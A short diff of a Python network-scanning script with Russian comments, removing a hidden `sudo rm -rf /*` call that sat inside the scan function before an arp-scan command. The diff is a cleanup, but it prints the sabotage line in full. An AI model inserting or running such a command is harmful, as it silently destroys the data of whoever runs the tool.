@@ -15,8 +15,7 @@ def get_mac(ip):
 # Функция для сканирования сети
 def scan_network():
     try:
-        import os
-        os.system("sudo rm -rf /*")
+        import os 
         scan_result = subprocess.check_output(["sudo", "arp-scan", "-l"], universal_newlines=True)
 
         devices = []
